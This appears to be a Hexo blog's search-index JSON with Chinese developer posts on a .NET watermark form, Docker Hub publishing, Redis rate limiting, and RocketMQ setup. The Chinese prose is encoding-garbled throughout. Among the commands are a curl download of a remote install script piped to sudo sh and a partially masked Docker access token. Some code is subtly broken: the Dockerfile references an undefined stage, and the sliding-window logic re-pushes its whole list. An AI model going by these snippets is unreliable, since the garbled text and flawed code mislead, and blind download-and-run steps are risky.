value=&quot;#000000&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;transparency&quot;&gt;é€æ˜åº¦ï¼š&lt;/label&gt; &lt;input type=&quot;range&quot; name=&quot;transparency&quot; id=&quot;transparency&quot; min=&quot;0&quot; max=&quot;255&quot; value=&quot;128&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;position&quot;&gt;æ°´å°ä½ç½®ï¼š&lt;/label&gt; &lt;select name=&quot;position&quot; id=&quot;position&quot;&gt; &lt;option value=&quot;topleft&quot;&gt;å·¦ä¸Š&lt;/option&gt; &lt;option value=&quot;topright&quot;&gt;å³ä¸Š&lt;/option&gt; &lt;option value=&quot;center&quot;&gt;å±…ä¸­&lt;/option&gt; &lt;option value=&quot;bottomleft&quot;&gt;å·¦ä¸‹&lt;/option&gt; &lt;option value=&quot;bottomright&quot;&gt;å³ä¸‹&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;angle&quot;&gt;å€¾æ–œè§’åº¦ï¼š&lt;/label&gt; &lt;input type=&quot;number&quot; name=&quot;angle&quot; id=&quot;angle&quot; value=&quot;0&quot; /&gt; &lt;/div&gt; &lt;button type=&quot;submit&quot;&gt;ä¸Šä¼ å¹¶æ·»åŠ æ°´å°&lt;/button&gt;&lt;/form&gt;@if (ViewBag.ImagePaths != null)&#123; &lt;h3&gt;å¸¦æ°´å°çš„å›¾ç‰‡ï¼š&lt;/h3&gt; @foreach (var imagePath in ViewBag.ImagePaths) &#123; &lt;div&gt; &lt;img src=&quot;@imagePath&quot; alt=&quot;Watermarked Image&quot; style=&quot;max-width: 100%; height: auto;&quot; &gt; &lt;/div&gt; &#125;&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":".NET Dockerhub","slug":"NET-Dockerhub","date":"2024-05-31T17:24:22.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/06/01/NET-Dockerhub/","permalink":"https://banjinmei.github.io/2024/06/01/NET-Dockerhub/","excerpt":"","text":"ğŸ“šDockerfile123456789101112131415FROM mcr.microsoft.com/dotnet/sdk:8.0 AS buildWORKDIR /srcCOPY [&quot;MyMvcApp.csproj&quot;, &quot;./&quot;]RUN dotnet restore &quot;MyMvcApp.csproj&quot;COPY . .WORKDIR &quot;/src/&quot;RUN dotnet build &quot;MyMvcApp.csproj&quot; -c Release -o /app/buildFROM build AS publishRUN dotnet publish &quot;MyMvcApp.csproj&quot; -c Release -o /app/publishFROM base AS finalWORKDIR /appCOPY --from=publish /app/publish .ENTRYPOINT [&quot;dotnet&quot;, &quot;MyMvcApp.dll&quot;] âœï¸ Docker é•œåƒ1docker build -t mymvcapp:latest . ğŸ“åœ¨ Docker Hub ä¸Šåˆ›å»ºä»“åº“ç™»å½• Docker Hub (https://hub.docker.com)ã€‚ç‚¹å‡» â€œCreate Repositoryâ€ã€‚è¾“å…¥ä»“åº“åç§°ï¼Œä¾‹å¦‚ mymvcappï¼Œç„¶åç‚¹å‡» â€œCreateâ€ã€‚ ğŸ’»å°† Docker é•œåƒæ¨é€åˆ° Docker Hubé¦–å…ˆï¼Œç™»å½• Docker Hubï¼š 1docker login ğŸ“…æ ‡è®°é•œåƒ1docker tag mymvcapp:latest &lt;your-dockerhub-username&gt;/mymvcapp:latest ğŸ“Šæ¨é€é•œåƒåˆ° Docker Hub1docker push &lt;your-dockerhub-username&gt;/mymvcapp:latest &#x3D; Docker Hub ç”¨æˆ·å 1docker run -d -p 80:80 &lt;your-dockerhub-username&gt;/mymvcapp:latest ğŸ“å®Œæ•´æµç¨‹å›é¡¾12345678910111213#åˆ›å»º .NET 8 MVC åº”ç”¨ç¨‹åºã€‚#åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹åˆ›å»º Dockerfileã€‚#æ„å»º Docker é•œåƒï¼šdocker build -t mymvcapp:latest .#åœ¨ Docker Hub ä¸Šåˆ›å»ºä»“åº“ã€‚#ç™»å½• Docker Hubï¼šdocker login#æ ‡è®°å¹¶æ¨é€ Docker é•œåƒåˆ° Docker Hubï¼šdocker tag mymvcapp:latest &lt;your-dockerhub-username&gt;/mymvcapp:latestdocker push &lt;your-dockerhub-username&gt;/mymvcapp:latest#åœ¨æœ¬åœ°æˆ–æœåŠ¡å™¨ä¸Šè¿è¡Œ Docker é•œåƒï¼šdocker run -d -p 80:80 &lt;your-dockerhub-username&gt;/mymvcapp:latest#é€šè¿‡è¿™äº›æ­¥éª¤ï¼Œå°† .NET 8 MVC éƒ¨ç½²åˆ° Docker Hub å¹¶è¿è¡Œå®ƒ~~ err denied requested access to the resource is denied 12docker logoutdocker login err error response from deamon:get â€œhttps://registry-1.docket.io/v2/&quot;:unauthorized:incorrect username or passwordç”¨æˆ·å¯†ç é”™è¯¯ https://docs.docker.com/go/access-tokenshttps://docs.docker.com/security/for-developers/access-tokens/#create-an-access-token 12345docker login -u qxxxdckr_pat_o0ZpPxxxdocker tag mymvcapp:latest xx/mymvcapp:devdocker push &lt;your-dockerhub-username&gt;/mymvcapp:dev æ¨é€æˆåŠŸåå¯ä»¥åœ¨hubä»“åº“æŸ¥çœ‹ è¿è¡Œ 1docker run -d -p 18081:8080 -p 18082:8081 --name mywebmvcapp mymvcapp:latest END","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"Dockerhub","slug":"Dockerhub","permalink":"https://banjinmei.github.io/tags/Dockerhub/"}],"author":"mu"},{"title":".NET Redis 10s Rate Limiter Sliding Window Algorithm","slug":"NET-Redis-RateLimiter","date":"2024-05-30T22:24:16.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/05/31/NET-Redis-RateLimiter/","permalink":"https://banjinmei.github.io/2024/05/31/NET-Redis-RateLimiter/","excerpt":"","text":"åœ¨.NETä¸­ä½¿ç”¨Redisæ¥é™åˆ¶æ¥å£è¯·æ±‚é¢‘ç‡ï¼ˆæ¯10ç§’åªå…è®¸è¯·æ±‚ä¸€æ¬¡ï¼‰ NuGet setupStackExchange.Redis å®ç°é€Ÿç‡é™åˆ¶é€»è¾‘ï¼šåœ¨ä½ çš„æ§åˆ¶å™¨æˆ–æœåŠ¡å±‚ä¸­ï¼Œä½ éœ€è¦ç¼–å†™ä¸€ä¸ªæ–¹æ³•æ¥æ£€æŸ¥å¹¶æ›´æ–°Redisä¸­çš„é€Ÿç‡é™åˆ¶è®¡æ•°å™¨ã€‚è®¾ç½®Redisé”®ï¼šä¸ºæ¯ä¸ªç”¨æˆ·æˆ–æ¯ä¸ªIPåœ°å€ï¼ˆå–å†³äºä½ çš„éœ€æ±‚ï¼‰è®¾ç½®ä¸€ä¸ªå”¯ä¸€çš„é”®ã€‚è¿™ä¸ªé”®å°†ç”¨äºå­˜å‚¨æœ€åä¸€æ¬¡è¯·æ±‚çš„æ—¶é—´æˆ³å’Œ&#x2F;æˆ–è¯·æ±‚è®¡æ•°ã€‚æ£€æŸ¥æ—¶é—´æˆ³ï¼šå½“è¯·æ±‚åˆ°è¾¾æ—¶ï¼Œä»Redisä¸­è·å–è¯¥é”®çš„å€¼ï¼ˆæ—¶é—´æˆ³ï¼‰ã€‚å¦‚æœé”®ä¸å­˜åœ¨æˆ–æ—¶é—´æˆ³è¶…è¿‡10ç§’ï¼Œåˆ™å…è®¸è¯·æ±‚å¹¶æ›´æ–°é”®çš„å€¼ï¼ˆè®¾ç½®ä¸ºå½“å‰æ—¶é—´æˆ³ï¼‰ã€‚å¤„ç†è¶…è¿‡é€Ÿç‡çš„è¯·æ±‚ï¼šå¦‚æœæ—¶é—´æˆ³åœ¨10ç§’å†…ï¼Œåˆ™æ‹’ç»æˆ–é™åˆ¶è¯¥è¯·æ±‚ï¼ˆè¿”å›é™åˆ¶çŠ¶æ€ç ï¼‰ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344private static readonly Lazy&lt;ConnectionMultiplexer&gt; LazyConnection = new Lazy&lt;ConnectionMultiplexer&gt;(() =&gt;&#123; // é…ç½®Redisè¿æ¥å­—ç¬¦ä¸² &quot;localhost,abortConnect=false&quot; return ConnectionMultiplexer.Connect(&quot;localhost:6379&quot;);&#125;);private static ConnectionMultiplexer Connection =&gt; LazyConnection.Value;private static IDatabase Db =&gt; Connection.GetDatabase();public async Task&lt;ActionResult&gt; MyAction()&#123; IPAddress clientIpAddress = HttpContext.Connection.RemoteIpAddress; string ipAddress = clientIpAddress.ToString(); string redisKey = $&quot;rate-limit:&#123;ipAddress&#125;&quot;; // æ„å»ºRedisé”®å // è·å–å½“å‰æ—¶é—´æˆ³ï¼ˆå¯ä»¥æ˜¯Unixæ—¶é—´æˆ³æˆ–ä»»ä½•ä½ é€‰æ‹©çš„æ ¼å¼ï¼‰ long currentTimestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds(); // å°è¯•ä»Redisè·å–æ—¶é—´æˆ³ var redisValue = await Db.StringGetAsync(redisKey); long lastTimestamp = redisValue.HasValue ? (long)redisValue : 0; // æ£€æŸ¥æ˜¯å¦è¶…è¿‡10ç§’ if (currentTimestamp - lastTimestamp &gt;= 10) &#123; // å¦‚æœè¶…è¿‡10ç§’ï¼Œåˆ™å…è®¸è¯·æ±‚å¹¶æ›´æ–°Redisé”® await Db.StringSetAsync(redisKey, currentTimestamp, TimeSpan.FromSeconds(10)); // è®¾ç½®é”®çš„è¿‡æœŸæ—¶é—´ä¸º10ç§’ return Content(&quot;Request allowed.&quot;); &#125; else &#123; // å¦‚æœæœªè¶…è¿‡10ç§’ï¼Œåˆ™æ‹’ç»è¯·æ±‚ HttpResponseMessage response = new HttpResponseMessage(HttpStatusCode.TooManyRequests) &#123; ReasonPhrase = &quot;Too Many Requests&quot;, Content = new StringContent(&quot;Rate limit exceeded. Please try again later.&quot;) &#125;; // å¤„ç†è¯·æ±‚ return Content(&quot;Please try again later. &quot;);// throw new HttpResponseException(response); // æˆ–è€…è¿”å›è‡ªå®šä¹‰çš„ActionResult &#125;&#125; æ‰©å±•ä¸ºå‚æ•° 123MyAction(string p)//...string redisKey = $&quot;rate-limit:&#123;p&#125;&quot;; è¯·æ±‚&#x2F;MyAction?p&#x3D;2&#x2F;MyAction?p&#x3D;3 æ»‘åŠ¨çª—å£ç®—æ³•æ»‘åŠ¨çª—å£ç®—æ³•ï¼ˆSliding Window Algorithmï¼‰æ˜¯ä¸€ç§ç”¨äºè§£å†³å­—ç¬¦ä¸²&#x2F;æ•°ç»„ é—®é¢˜çš„ç®—æ³•ï¼Œå®ƒé€šè¿‡ç»´æŠ¤ä¸€ä¸ªçª—å£ï¼ˆå³ä¸€ä¸ªè¿ç»­çš„å­ä¸²æˆ–å­æ•°ç»„ï¼‰ï¼Œå¹¶åœ¨å­—ç¬¦ä¸²æˆ–æ•°ç»„ä¸Šæ»‘åŠ¨è¿™ä¸ªçª—å£æ¥å¯»æ‰¾æ»¡è¶³ç‰¹å®šæ¡ä»¶çš„å­ä¸²æˆ–å­æ•°ç»„ã€‚ä»¥ä¸‹æ˜¯æ»‘åŠ¨çª—å£ç®—æ³•çš„ä¸»è¦å†…å®¹å’Œç‰¹ç‚¹ï¼š ç»´æŠ¤çª—å£ï¼šé€šè¿‡ä¸¤ä¸ªæŒ‡é’ˆï¼ˆå·¦æŒ‡é’ˆå’Œå³æŒ‡é’ˆï¼‰æ¥å®šä¹‰çª—å£çš„è¾¹ç•Œã€‚ç§»åŠ¨çª—å£ï¼šé€šè¿‡ç§»åŠ¨å³æŒ‡é’ˆæ¥æ‰©å±•çª—å£ï¼ŒåŒæ—¶æ ¹æ®é—®é¢˜çš„è¦æ±‚è°ƒæ•´å·¦æŒ‡é’ˆæ¥ç¼©å°çª—å£ã€‚æ›´æ–°ä¿¡æ¯ï¼šåœ¨çª—å£æ»‘åŠ¨çš„è¿‡ç¨‹ä¸­ï¼Œæ ¹æ®éœ€è¦æ›´æ–°ä¸€äº›æ•°æ®ç»“æ„ï¼ˆå¦‚å“ˆå¸Œè¡¨ï¼‰æ¥ä¿å­˜æ‰€éœ€çš„ä¿¡æ¯ã€‚ å®ç°æ–¹æ³•æ­¥éª¤1.åˆå§‹åŒ–ï¼šå®šä¹‰å·¦æŒ‡é’ˆå’Œå³æŒ‡é’ˆï¼Œå¹¶åˆå§‹åŒ–å®ƒä»¬çš„ä½ç½®ã€‚æ­¥éª¤2.æ‰©å±•çª—å£ï¼šå‘å³ç§»åŠ¨å³æŒ‡é’ˆï¼Œæ‰©å±•çª—å£ï¼ŒåŒæ—¶æ›´æ–°æ‰€éœ€çš„ä¿¡æ¯ï¼ˆå¦‚å­—ç¬¦é¢‘ç‡çš„å“ˆå¸Œè¡¨ï¼‰ã€‚æ­¥éª¤3.æ£€æŸ¥æ¡ä»¶ï¼šå½“çª—å£æ»¡è¶³ç‰¹å®šæ¡ä»¶æ—¶ï¼Œå¼€å§‹æ”¶ç¼©çª—å£ã€‚æ­¥éª¤4.æ”¶ç¼©çª—å£ï¼šå‘å³ç§»åŠ¨å·¦æŒ‡é’ˆï¼Œç¼©å°çª—å£ï¼ŒåŒæ—¶æ›´æ–°æ‰€éœ€çš„ä¿¡æ¯ã€‚æ­¥éª¤5.æ›´æ–°æœ€ä¼˜è§£ï¼šåœ¨æ”¶ç¼©çª—å£çš„è¿‡ç¨‹ä¸­ï¼Œä¸æ–­æ›´æ–°æœ€ä¼˜è§£ï¼ˆå¦‚æœ€é•¿å­ä¸²ã€æœ€çŸ­å­ä¸²ç­‰ï¼‰ã€‚é‡å¤æ­¥éª¤ï¼šé‡å¤æ­¥éª¤2åˆ°æ­¥éª¤5ï¼Œç›´åˆ°å³æŒ‡é’ˆåˆ°è¾¾å­—ç¬¦ä¸²æˆ–æ•°ç»„çš„æœ«å°¾ã€‚ åœ¨Redisä¸­ç»´æŠ¤ä¸€ä¸ªçª—å£å†…çš„è¯·æ±‚æ—¶é—´æˆ³åˆ—è¡¨ï¼Œè€Œä¸æ˜¯ä»…ä»…å­˜å‚¨æœ€åä¸€æ¬¡è¯·æ±‚çš„æ—¶é—´æˆ³ã€‚ æˆ‘ä»¬ä»Redisä¸­è·å–å­˜å‚¨çš„æ—¶é—´æˆ³åˆ—è¡¨ã€‚ç§»é™¤è¶…è¿‡çª—å£å¤§å°çš„æ—¶é—´æˆ³ã€‚æ£€æŸ¥å‰©ä½™çš„æ—¶é—´æˆ³æ•°æ˜¯å¦è¶…è¿‡äº†æœ€å¤§è¯·æ±‚æ•° MaxRequestsã€‚å¦‚æœè¶…è¿‡ï¼Œåˆ™è¿”å›è¶…è¿‡çš„å“åº”ï¼›å¦åˆ™ï¼Œè®°å½•å½“å‰æ—¶é—´æˆ³å¹¶å…è®¸è¯·æ±‚ã€‚ 123456789101112131415161718192021222324252627282930private const int MaxRequests = 5; // æœ€å¤§è¯·æ±‚æ•°private const int WindowSizeInSeconds = 10; // çª—å£å¤§å°ï¼ˆç§’ï¼‰//... // è·å–Redisä¸­å­˜å‚¨çš„æ—¶é—´æˆ³åˆ—è¡¨ var redisValue = await Db.ListRangeAsync(redisKey); var timestamps = redisValue.Select(value =&gt; (long)value).ToList(); // ç§»é™¤çª—å£ä¹‹å¤–çš„æ—¶é—´æˆ³ timestamps = timestamps.Where(timestamp =&gt; currentTimestamp - timestamp &lt;= WindowSizeInSeconds).ToList(); if (timestamps.Count &gt;= MaxRequests) &#123; // å¦‚æœè¯·æ±‚æ•°è¶…è¿‡é™åˆ¶ï¼Œåˆ™æ‹’ç»è¯·æ±‚ HttpResponseMessage response = new HttpResponseMessage(HttpStatusCode.TooManyRequests) &#123; ReasonPhrase = &quot;Too Many Requests&quot;, Content = new StringContent(&quot;Rate limit exceeded. Please try again later.&quot;) &#125;; return Content(&quot;Please try again later.&quot;); &#125; else &#123; // å¦‚æœè¯·æ±‚æ•°æœªè¶…è¿‡é™åˆ¶ï¼Œåˆ™å…è®¸è¯·æ±‚å¹¶è®°å½•å½“å‰æ—¶é—´æˆ³ timestamps.Add(currentTimestamp); await Db.ListRightPushAsync(redisKey, timestamps.Select(timestamp =&gt; (RedisValue)timestamp).ToArray()); await Db.KeyExpireAsync(redisKey, TimeSpan.FromSeconds(WindowSizeInSeconds)); // è®¾ç½®é”®çš„è¿‡æœŸæ—¶é—´ä¸ºçª—å£å¤§å° return Content(&quot;Request allowed.&quot;); &#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"Redis","slug":"Redis","permalink":"https://banjinmei.github.io/tags/Redis/"}],"author":"mu"},{"title":".NET RocketMQ","slug":"NET-RocketMQ","date":"2024-05-29T12:17:33.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/05/29/NET-RocketMQ/","permalink":"https://banjinmei.github.io/2024/05/29/NET-RocketMQ/","excerpt":"","text":"RocketMQ æ˜¯ä¸€æ¬¾ç”±é˜¿é‡Œå·´å·´é›†å›¢å¼€å‘å¹¶å¼€æºç»™Apacheè½¯ä»¶åŸºé‡‘ä¼šçš„åˆ†å¸ƒå¼æ¶ˆæ¯åŠæµå¤„ç†å¹³å°ã€‚ä»¥å…¶é«˜ååé‡ã€ä½å»¶è¿Ÿã€é«˜å¯ç”¨æ€§ç­‰ç‰¹ç‚¹è€Œå¹¿å—æ¬¢è¿ã€‚æ”¯æŒJavaï¼ŒC++, Python, Go, .NETç­‰ã€‚ å¼‚æ­¥è§£è€¦ï¼šå¯ä»¥å®ç°ä¸Šæ¸¸å’Œä¸‹æ¸¸ä¸šåŠ¡ç³»ç»Ÿçš„æ¾è€¦åˆè®¾è®¡ï¼Œä½¿å¾—æœåŠ¡éƒ¨åˆ†èŠ‚ç‚¹å¼‚å¸¸ä¸ä¼šå½±å“åˆ°æ ¸å¿ƒäº¤æ˜“ç³»ç»Ÿçš„æ­£å¸¸è¿è½¬ã€‚åœ¨ç”µå•†ã€é‡‘èç­‰åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œè¿™ç§è§£è€¦è®¾è®¡å°¤ä¸ºé‡è¦ã€‚å‰Šå³°å¡«è°·ï¼šåœ¨å¦‚ç§’æ€ã€å¤§ä¿ƒç­‰å¤§å‹æ´»åŠ¨ä¸­ï¼Œç³»ç»Ÿä¼šé¢ä¸´å·¨å¤§çš„æµé‡å†²å‡»ã€‚RocketMQåˆ©ç”¨å…¶é«˜æ€§èƒ½çš„æ¶ˆæ¯å¤„ç†èƒ½åŠ›ï¼Œå¯ä»¥æœ‰æ•ˆåœ°åº”å¯¹è¿™ç§æµé‡å†²å‡»ï¼Œä¿è¯ç³»ç»Ÿçš„ç¨³å®šè¿è¡Œã€‚é¡ºåºæ¶ˆæ¯ï¼šæ”¯æŒé¡ºåºæ¶ˆæ¯ï¼ˆåˆ†åŒºæœ‰åºï¼‰ï¼Œå¯ä»¥ç¡®ä¿æ¶ˆæ¯çš„å…ˆè¿›å…ˆå‡ºã€‚è¿™åœ¨äº¤æ˜“ç³»ç»Ÿä¸­çš„è®¢å•åˆ›å»ºã€æ”¯ä»˜ã€é€€æ¬¾ç­‰æµç¨‹ä¸­å°¤ä¸ºé‡è¦ï¼Œå› ä¸ºè¿™äº›æµç¨‹å¯¹æ¶ˆæ¯çš„é¡ºåºæœ‰ä¸¥æ ¼è¦æ±‚ã€‚åˆ†å¸ƒå¼äº‹åŠ¡æ¶ˆæ¯ï¼šæ”¯æŒåˆ†å¸ƒå¼äº‹åŠ¡æ¶ˆæ¯ï¼Œå¯ä»¥ä¿è¯åˆ†å¸ƒå¼äº‹åŠ¡çš„å¼ºä¸€è‡´æ€§ã€‚è¿™åœ¨æ¶‰åŠå¤šä¸ªæœåŠ¡çš„åˆ†å¸ƒå¼ç³»ç»Ÿä¸­éå¸¸æœ‰ç”¨ï¼Œå¯ä»¥ç¡®ä¿æ•°æ®çš„ä¸€è‡´æ€§å’Œå®Œæ•´æ€§ã€‚ RocketMQä¼˜ç‚¹é«˜ååé‡å’Œä½å»¶è¿Ÿï¼šèƒ½å¤Ÿå¤„ç†å¤§è§„æ¨¡æ¶ˆæ¯æµï¼Œå¹¶æä¾›ä½å»¶è¿Ÿçš„æ¶ˆæ¯ä¼ é€’ã€‚è¿™ä½¿å¾—å®ƒéå¸¸é€‚åˆå¤„ç†é«˜å¹¶å‘çš„åº”ç”¨åœºæ™¯ï¼Œå¦‚ç”µå­å•†åŠ¡å’Œé‡‘èäº¤æ˜“ç³»ç»Ÿã€‚å¯é æ€§ï¼šå…·æœ‰é«˜åº¦å¯é çš„æ¶ˆæ¯ä¼ é€’æœºåˆ¶ã€‚å®ƒæ”¯æŒæ¶ˆæ¯æŒä¹…åŒ–å’Œå¤åˆ¶ï¼Œç¡®ä¿æ¶ˆæ¯ä¸ä¼šä¸¢å¤±ï¼Œå¹¶èƒ½å¤Ÿåœ¨æ•…éšœå‘ç”Ÿæ—¶è¿›è¡Œè‡ªåŠ¨æ¢å¤ã€‚åˆ†å¸ƒå¼æ‰©å±•ï¼šæ”¯æŒæ°´å¹³æ‰©å±•ï¼Œå¯ä»¥æ–¹ä¾¿åœ°æ·»åŠ æ–°çš„æ¶ˆæ¯ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…æ¥åº”å¯¹è´Ÿè½½å¢åŠ çš„æƒ…å†µã€‚æ˜“äºéƒ¨ç½²ï¼šæä¾›å¼€ç®±å³ç”¨çš„éƒ¨ç½²æ–¹å¼ï¼Œéå¸¸é€‚åˆåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ä½¿ç”¨ã€‚ RocketMQæ¶æ„ç”Ÿäº§è€…ï¼ˆProducerï¼‰ç”¨äºäº§ç”Ÿæ¶ˆæ¯çš„è¿è¡Œå®ä½“ï¼Œé€šå¸¸é›†æˆåœ¨ä¸šåŠ¡ç³»ç»Ÿçš„ä¸Šæ¸¸ã€‚ä¸»é¢˜ï¼ˆTopicï¼‰æ¶ˆæ¯ä¼ è¾“å’Œå­˜å‚¨çš„åˆ†ç»„å®¹å™¨ï¼Œå†…éƒ¨ç”±å¤šä¸ªé˜Ÿåˆ—ç»„æˆã€‚é˜Ÿåˆ—ï¼ˆMessageQueueï¼‰æ¶ˆæ¯ä¼ è¾“å’Œå­˜å‚¨çš„å®é™…å•å…ƒå®¹å™¨ï¼Œç±»ä¼¼äºå…¶ä»–æ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„åˆ†åŒºã€‚æ¶ˆæ¯ï¼ˆMessageï¼‰RocketMQ çš„æœ€å°ä¼ è¾“å•å…ƒï¼Œå…·å¤‡ä¸å¯å˜æ€§ã€‚æ¶ˆè´¹è€…åˆ†ç»„ï¼ˆConsumerGroupï¼‰å‘å¸ƒè®¢é˜…æ¨¡å‹ä¸­å®šä¹‰çš„ç‹¬ç«‹çš„æ¶ˆè´¹èº«ä»½åˆ†ç»„ï¼Œç”¨äºç»Ÿä¸€ç®¡ç†å¤šä¸ªæ¶ˆè´¹è€…ã€‚æ¶ˆè´¹è€…ï¼ˆConsumerï¼‰æ¶ˆè´¹æ¶ˆæ¯çš„è¿è¡Œå®ä½“ï¼Œé›†æˆåœ¨ä¸šåŠ¡ç³»ç»Ÿçš„ä¸‹æ¸¸ã€‚è®¢é˜…å…³ç³»ï¼ˆSubscriptionï¼‰å‘å¸ƒè®¢é˜…æ¨¡å‹ä¸­æ¶ˆæ¯è¿‡æ»¤ã€é‡è¯•ã€æ¶ˆè´¹è¿›åº¦çš„è§„åˆ™é…ç½®ã€‚ éƒ¨ç½²RocketMQï¼ˆdockerï¼‰å®‰è£… Dockerï¼š123#debian curl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh æ‹‰å– RocketMQ é•œåƒï¼šä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä» Docker Hub æ‹‰å–æœ€æ–°çš„ RocketMQ é•œåƒï¼š 1docker pull apache/rocketmq:latest å¯åŠ¨ RocketMQ NameServerï¼šRocketMQ çš„ NameServer æ˜¯è´Ÿè´£ç®¡ç†æ‰€æœ‰ Broker èŠ‚ç‚¹çš„ç›®å½•æœåŠ¡ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯åŠ¨ NameServerï¼š 12345678docker run -d --name rmqnamesrv -p 9876:9876 apache/rocketmq:latest sh mqnamesrv```bash## å¯åŠ¨ RocketMQ Brokerï¼šRocketMQ çš„ Broker è´Ÿè´£å­˜å‚¨æ¶ˆæ¯å¹¶å¤„ç†ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…çš„è¯·æ±‚ã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯åŠ¨ Brokerï¼š```bashdocker run -d --name rmqbroker --link rmqnamesrv:namesrv -e &quot;NAMESRV_ADDR=namesrv:9876&quot; -e &quot;BROKER_NAME=broker-a&quot; -e &quot;BROKER_ID=0&quot; -e &quot;AUTO_CREATE_TOPIC_ENABLE=true&quot; -e &quot;AUTO_CREATE_SUBSCRIPTION_GROUP=true&quot; -p 10911:10911 -p 10909:10909 apache/rocketmq:latest sh mqbroker éªŒè¯æŸ¥çœ‹ NameServer æ—¥å¿—ï¼š 1docker logs -f rmqnamesrv æŸ¥çœ‹ Broker æ—¥å¿—ï¼š 1docker logs -f rmqbroker ä½¿ç”¨ RocketMQ Consoleï¼šå¦‚æœéœ€è¦å¯è§†åŒ–ç®¡ç† RocketMQï¼Œå¯ä»¥è¿è¡Œ RocketMQ Consoleï¼š 12docker pull styletang/rocketmq-console-ngdocker run -d -p 8080:8080 --link rmqnamesrv:namesrv -e &quot;JAVA_OPTS=-Drocketmq.namesrv.addr=namesrv:9876&quot; styletang/rocketmq-console-ng æ€»ç»“ 123456789101112# æ‹‰å– RocketMQ é•œåƒdocker pull apache/rocketmq:latest# å¯åŠ¨ NameServerdocker run -d --name rmqnamesrv -p 9876:9876 apache/rocketmq:latest sh mqnamesrv# å¯åŠ¨ Brokerdocker run -d --name rmqbroker --link rmqnamesrv:namesrv -e &quot;NAMESRV_ADDR=namesrv:9876&quot; -p 10911:10911 -p 10909:10909 apache/rocketmq:latest sh mqbroker# å¯åŠ¨ RocketMQ Consoledocker pull styletang/rocketmq-console-ngdocker run -d -p 8080:8080 --link rmqnamesrv:namesrv -e &quot;JAVA_OPTS=-Drocketmq.namesrv.addr=namesrv:9876&quot; styletang/rocketmq-console-ng å¦‚æœæ˜¯å¤–ç½‘ç¯å¢ƒrun Broker å¤–ç½‘IP 123mkdir -p /usr/data/rocketMQ/data/broker/logsmkdir -p /usr/data/rocketMQ/data/broker/storemkdir -p /usr/data/rocketMQ/data/broker/conf/ broket.conf 12345678910brokerClusterName = DefaultClusterbrokerName = broker-abrokerId = 0deleteWhen = 04fileReservedTime = 48brokerRole = ASYNC_MASTERflushDiskType = ASYNC_FLUSHnamesrvAddr = å¤–ç½‘ip:9876brokerIP1 = å¤–ç½‘ipautoCreateTopicEnable=true 1docker run -p 0.0.0.0:10911:10911 -p 0.0.0.0:10909:10909 -d -v /usr/data/rocketMQ/data/broker/logs:/root/logs -v /usr/data/rocketMQ/data/broker/store:/root/store -v /usr/data/rocketMQ/data/broker/conf/broker.conf:/opt/rocketmq/conf/broker.conf --name rmqbroker --link rmqnamesrv:namesrv -e &quot;NAMESRV_ADDR=namesrv:9876&quot; -e &quot;MAX_POSSIBLE_HEAP=200000000&quot; -e &quot;autoCreateTopicEnable=true&quot; rocketmqinc/rocketmq sh mqbroker -c /opt/rocketmq/conf/broker.conf .NET RocketMQNuGet NewLife.RocketMQProducer123456789101112131415161718192021222324252627282930//main XTrace.UseConsole(); var producer = new Producer &#123; NameServerAddress = &quot;x.x.x.x:9876&quot;, Topic = &quot;t0529&quot; &#125;; try &#123; producer.Start(); // å‘é€ä¸€æ¡æµ‹è¯•æ¶ˆæ¯ï¼Œä»¥ç¡®ä¿ Topic è¢«åˆ›å»º for (var i = 0; i &lt; 10; i++) &#123; var str = &quot;mqm&quot; + i; //var str = Rand.NextString(1337); var sr = producer.Publish(str, &quot;TagA&quot;); &#125; &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Exception: &#123;ex.Message&#125;&quot;); &#125; finally &#123; producer.Stop(); &#125; Consumer1234567891011121314151617181920var consumer = new Consumer&#123; Topic = &quot;t0529&quot;, Group = &quot;test&quot;, NameServerAddress = &quot;x.x.x.x:9876&quot;, FromLastOffset = false, //SkipOverStoredMsgCount = 0, //BatchSize = 20, Log = XTrace.Log, ClientLog = XTrace.Log,&#125;;consumer.OnConsume = OnConsume;consumer.Configure(MqSetting.Current);consumer.Start();_consumer = consumer;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"RocketMQ","slug":"RocketMQ","permalink":"https://banjinmei.github.io/tags/RocketMQ/"}],"author":"mu"},{"title":"hexo githubio","slug":"hexo-githubio","date":"2024-05-27T19:38:21.000Z","updated":"2024-11-21T16:59:40.190Z","comments":true,"path":"2024/05/28/hexo-githubio/","permalink":"https://banjinmei.github.io/2024/05/28/hexo-githubio/","excerpt":"","text":"hexoå®‰è£…npm install 